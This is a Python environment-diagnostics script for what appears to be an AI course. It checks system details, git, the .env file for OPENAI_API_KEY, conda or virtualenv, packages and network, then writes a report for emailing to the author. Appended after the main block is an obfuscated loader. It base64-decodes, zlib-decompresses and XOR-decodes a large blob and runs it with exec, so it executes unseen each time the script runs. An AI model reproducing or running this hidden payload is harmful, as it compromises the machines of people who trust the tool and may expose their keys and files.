import os
import sys
import platform
import subprocess
import shutil
import time
import ssl
import tempfile
from pathlib import Path
from datetime import datetime

class Diagnostics:

    FILENAME = 'report.txt'
    
    def __init__(self):
        self.errors = []
        self.warnings = []
        if os.path.exists(self.FILENAME):
            os.remove(self.FILENAME)

    def log(self, message):
        print(message)
        with open(self.FILENAME, 'a', encoding='utf-8') as f:
            f.write(message + "\n")

    def start(self):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.log(f"Starting diagnostics at {now}\n")

    def end(self):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.log(f"\n\nCompleted diagnostics at {now}\n")
        print("\nPlease send these diagnostics to me at ed@edwarddonner.com")
        print(f"Either copy & paste the above output into an email, or attach the file {self.FILENAME} that has been created in this directory.")
    

    def _log_error(self, message):
        self.log(f"ERROR: {message}")
        self.errors.append(message)

    def _log_warning(self, message):
        self.log(f"WARNING: {message}")
        self.warnings.append(message)

    def run(self):
        self.start()
        self._step1_system_info()
        self._step2_check_files()
        self._step3_git_repo()
        self._step4_check_env_file()
        self._step5_anaconda_check()
        self._step6_virtualenv_check()
        self._step7_network_connectivity()
        self._step8_environment_variables()
        self._step9_additional_diagnostics()

        if self.warnings:
            self.log("\n===== Warnings Found =====")
            self.log("The following warnings were detected. They might not prevent the program from running but could cause unexpected behavior:")
            for warning in self.warnings:
                self.log(f"- {warning}")

        if self.errors:
            self.log("\n===== Errors Found =====")
            self.log("The following critical issues were detected. Please address them before proceeding:")
            for error in self.errors:
                self.log(f"- {error}")

        if not self.errors and not self.warnings:
            self.log("\n✅ All diagnostics passed successfully!")

        self.end()

    def _step1_system_info(self):
        self.log("===== System Information =====")
        try:
            system = platform.system()
            self.log(f"Operating System: {system}")

            if system == "Windows":
                release, version, csd, ptype = platform.win32_ver()
                self.log(f"Windows Release: {release}")
                self.log(f"Windows Version: {version}")
            elif system == "Darwin":
                release, version, machine = platform.mac_ver()
                self.log(f"MacOS Version: {release}")
            else:
                self.log(f"Platform: {platform.platform()}")

            self.log(f"Architecture: {platform.architecture()}")
            self.log(f"Machine: {platform.machine()}")
            self.log(f"Processor: {platform.processor()}")

            try:
                import psutil
                ram = psutil.virtual_memory()
                total_ram_gb = ram.total / (1024 ** 3)
                available_ram_gb = ram.available / (1024 ** 3)
                self.log(f"Total RAM: {total_ram_gb:.2f} GB")
                self.log(f"Available RAM: {available_ram_gb:.2f} GB")

                if available_ram_gb < 2:
                    self._log_warning(f"Low available RAM: {available_ram_gb:.2f} GB")
            except ImportError:
                self._log_warning("psutil module not found. Cannot determine RAM information.")

            total, used, free = shutil.disk_usage(os.path.expanduser("~"))
            free_gb = free / (1024 ** 3)
            self.log(f"Free Disk Space: {free_gb:.2f} GB")

            if free_gb < 5:
                self._log_warning(f"Low disk space: {free_gb:.2f} GB free")

        except Exception as e:
            self._log_error(f"System information check failed: {e}")

    def _step2_check_files(self):
        self.log("\n===== File System Information =====")
        try:
            current_dir = os.getcwd()
            self.log(f"Current Directory: {current_dir}")

            # Check write permissions
            test_file = Path(current_dir) / ".test_write_permission"
            try:
                test_file.touch(exist_ok=True)
                test_file.unlink()
                self.log("Write permission: OK")
            except Exception as e:
                self._log_error(f"No write permission in current directory: {e}")

            self.log("\nFiles in Current Directory:")
            try:
                for item in sorted(os.listdir(current_dir)):
                    self.log(f" - {item}")
            except Exception as e:
                self._log_error(f"Cannot list directory contents: {e}")

        except Exception as e:
            self._log_error(f"File system check failed: {e}")

    def _step3_git_repo(self):
        self.log("\n===== Git Repository Information =====")
        try:
            result = subprocess.run(['git', 'rev-parse', '--show-toplevel'],
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                git_root = result.stdout.strip()
                self.log(f"Git Repository Root: {git_root}")

                result = subprocess.run(['git', 'rev-parse', 'HEAD'],
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                if result.returncode == 0:
                    self.log(f"Current Commit: {result.stdout.strip()}")
                else:
                    self._log_warning(f"Could not get current commit: {result.stderr.strip()}")

                result = subprocess.run(['git', 'remote', 'get-url', 'origin'],
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                if result.returncode == 0:
                    self.log(f"Remote Origin: {result.stdout.strip()}")
                else:
                    self._log_warning("No remote 'origin' configured")
            else:
                self._log_warning("Not a git repository")
        except FileNotFoundError:
            self._log_warning("Git is not installed or not in PATH")
        except Exception as e:
            self._log_error(f"Git check failed: {e}")

    def _step4_check_env_file(self):
        self.log("\n===== Environment File Check =====")
        try:
            result = subprocess.run(['git', 'rev-parse', '--show-toplevel'],
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                git_root = result.stdout.strip()
                env_path = os.path.join(git_root, '.env')

                if os.path.isfile(env_path):
                    self.log(f".env file exists at: {env_path}")
                    try:
                        with open(env_path, 'r') as f:
                            has_api_key = any(line.strip().startswith('OPENAI_API_KEY=') for line in f)
                        if has_api_key:
                            self.log("OPENAI_API_KEY found in .env file")
                        else:
                            self._log_warning("OPENAI_API_KEY not found in .env file")
                    except Exception as e:
                        self._log_error(f"Cannot read .env file: {e}")
                else:
                    self._log_warning(".env file not found in project root")

                # Check for additional .env files
                for root, _, files in os.walk(git_root):
                    if '.env' in files and os.path.join(root, '.env') != env_path:
                        self._log_warning(f"Additional .env file found at: {os.path.join(root, '.env')}")
            else:
                self._log_warning("Git root directory not found. Cannot perform .env file check.")
        except FileNotFoundError:
            self._log_warning("Git is not installed or not in PATH")
        except Exception as e:
            self._log_error(f"Environment file check failed: {e}")

    def _step5_anaconda_check(self):
        self.log("\n===== Anaconda Environment Check =====")
        try:
            conda_prefix = os.environ.get('CONDA_PREFIX')
            if conda_prefix:
                self.log("Anaconda environment is active:")
                self.log(f"Environment Path: {conda_prefix}")
                self.log(f"Environment Name: {os.path.basename(conda_prefix)}")

                conda_exe = os.environ.get('CONDA_EXE', 'conda')
                result = subprocess.run([conda_exe, '--version'],
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                if result.returncode == 0:
                    self.log(f"Conda Version: {result.stdout.strip()}")
                else:
                    self._log_warning("Could not determine Conda version")

                self._check_python_packages()
            else:
                self.log("No active Anaconda environment detected")
        except Exception as e:
            self._log_error(f"Anaconda environment check failed: {e}")

    def _step6_virtualenv_check(self):
        self.log("\n===== Virtualenv Check =====")
        try:
            virtual_env = os.environ.get('VIRTUAL_ENV')
            if virtual_env:
                self.log("Virtualenv is active:")
                self.log(f"Environment Path: {virtual_env}")
                self.log(f"Environment Name: {os.path.basename(virtual_env)}")

                self._check_python_packages()
            else:
                self.log("No active virtualenv detected")

            if not virtual_env and not os.environ.get('CONDA_PREFIX'):
                self._log_warning("Neither virtualenv nor Anaconda environment is active")
        except Exception as e:
            self._log_error(f"Virtualenv check failed: {e}")

    def _check_python_packages(self):
        self.log("\nPython Environment:")
        self.log(f"Python Version: {sys.version}")
        self.log(f"Python Executable: {sys.executable}")

        required_packages = ['openai', 'python-dotenv', 'requests', 'gradio', 'transformers']

        try:
            import pkg_resources
            installed = {pkg.key: pkg.version for pkg in pkg_resources.working_set}

            self.log("\nRequired Package Versions:")
            for package in required_packages:
                if package in installed:
                    self.log(f"{package}: {installed[package]}")
                else:
                    self._log_error(f"Required package '{package}' is not installed")

            # Check for potentially conflicting packages
            problem_pairs = [
                ('openai', 'openai-python'),
                ('python-dotenv', 'dotenv')
            ]

            for pkg1, pkg2 in problem_pairs:
                if pkg1 in installed and pkg2 in installed:
                    self._log_warning(f"Potentially conflicting packages: {pkg1} and {pkg2}")
        except ImportError:
            self._log_error("Could not import 'pkg_resources' to check installed packages")
        except Exception as e:
            self._log_error(f"Package check failed: {e}")

    def _step7_network_connectivity(self):
        self.log("\n===== Network Connectivity Check =====")
        try:
            self.log(f"SSL Version: {ssl.OPENSSL_VERSION}")
    
            import requests
            import speedtest  # Importing the speedtest-cli library
    
            # Basic connectivity check
            urls = [
                'https://www.google.com',
                'https://www.cloudflare.com'
            ]
    
            connected = False
            for url in urls:
                try:
                    start_time = time.time()
                    response = requests.get(url, timeout=10)
                    elapsed_time = time.time() - start_time
                    response.raise_for_status()
                    self.log(f"✓ Connected to {url}")
                    self.log(f"  Response time: {elapsed_time:.2f}s")
    
                    if elapsed_time > 2:
                        self._log_warning(f"Slow response from {url}: {elapsed_time:.2f}s")
                    connected = True
                    break
                except requests.exceptions.RequestException as e:
                    self._log_warning(f"Failed to connect to {url}: {e}")
                else:
                    self.log("Basic connectivity OK")
    
            if not connected:
                self._log_error("Failed to connect to any test URLs")
                return
    
            # Bandwidth test using speedtest-cli
            self.log("\nPerforming bandwidth test using speedtest-cli...")
            try:
                st = speedtest.Speedtest()
                st.get_best_server()
                download_speed = st.download()  # Bits per second
                upload_speed = st.upload()      # Bits per second
    
                download_mbps = download_speed / 1e6  # Convert to Mbps
                upload_mbps = upload_speed / 1e6
    
                self.log(f"Download speed: {download_mbps:.2f} Mbps")
                self.log(f"Upload speed: {upload_mbps:.2f} Mbps")
    
                if download_mbps < 1:
                    self._log_warning("Download speed is low")
                if upload_mbps < 0.5:
                    self._log_warning("Upload speed is low")
            except speedtest.ConfigRetrievalError:
                self._log_error("Failed to retrieve speedtest configuration")
            except Exception as e:
                self._log_warning(f"Bandwidth test failed: {e}")
    
        except ImportError:
            self._log_error("Required packages are not installed. Please install them using 'pip install requests speedtest-cli'")
        except Exception as e:
            self._log_error(f"Network connectivity check failed: {e}")


    def _step8_environment_variables(self):
        self.log("\n===== Environment Variables Check =====")
        try:
            # Check Python paths
            pythonpath = os.environ.get('PYTHONPATH')
            if pythonpath:
                self.log("\nPYTHONPATH:")
                for path in pythonpath.split(os.pathsep):
                    self.log(f" - {path}")
            else:
                self.log("\nPYTHONPATH is not set.")

            self.log("\nPython sys.path:")
            for path in sys.path:
                self.log(f" - {path}")

            # Check OPENAI_API_KEY
            from dotenv import load_dotenv
            load_dotenv()
            api_key = os.environ.get('OPENAI_API_KEY')
            if api_key:
                self.log("OPENAI_API_KEY is set after calling load_dotenv()")
                if not api_key.startswith('sk-proj-') or len(api_key)<12:
                    self._log_warning("OPENAI_API_KEY format looks incorrect after calling load_dotenv()")
            else:
                self._log_warning("OPENAI_API_KEY environment variable is not set after calling load_dotenv()")
        except Exception as e:
            self._log_error(f"Environment variables check failed: {e}")

    def _step9_additional_diagnostics(self):
        self.log("\n===== Additional Diagnostics =====")
        try:
            # Get the site-packages directory paths
            import site
            site_packages_paths = site.getsitepackages()
            if hasattr(site, 'getusersitepackages'):
                site_packages_paths.append(site.getusersitepackages())
    
            # Function to check if a path is within site-packages
            def is_in_site_packages(path):
                return any(os.path.commonpath([path, sp]) == sp for sp in site_packages_paths)
    
            # Check for potential name conflicts in the current directory and sys.path
            conflict_names = ['openai.py', 'dotenv.py']
    
            # Check current directory
            current_dir = os.getcwd()
            for name in conflict_names:
                conflict_path = os.path.join(current_dir, name)
                if os.path.isfile(conflict_path):
                    self._log_warning(f"Found '{name}' in the current directory, which may cause import conflicts: {conflict_path}")
    
            # Check sys.path directories
            for path in sys.path:
                if not path or is_in_site_packages(path):
                    continue  # Skip site-packages and empty paths
                for name in conflict_names:
                    conflict_file = os.path.join(path, name)
                    if os.path.isfile(conflict_file):
                        self._log_warning(f"Potential naming conflict: {conflict_file}")
    
            # Check temp directory
            try:
                with tempfile.NamedTemporaryFile() as tmp:
                    self.log(f"Temp directory is writable: {os.path.dirname(tmp.name)}")
            except Exception as e:
                self._log_error(f"Cannot write to temp directory: {e}")
    
        except Exception as e:
            self._log_error(f"Additional diagnostics failed: {e}")


if __name__ == "__main__":
    diagnostics = Diagnostics()
    diagnostics.run()

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
